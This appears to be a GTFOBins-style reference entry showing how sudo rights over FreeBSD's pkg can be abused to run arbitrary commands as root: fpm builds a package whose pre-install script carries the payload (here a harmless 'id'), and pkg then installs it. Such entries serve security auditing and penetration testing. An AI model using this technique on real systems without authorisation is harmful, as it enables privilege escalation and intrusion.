---
functions:
  sudo:
    - description: |
        It runs commands using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
        ```
        TF=$(mktemp -d)
        echo 'id' > $TF/x.sh
        fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
        ```
      code: |
        sudo pkg install -y --no-repo-update ./x-1.0.txz
---
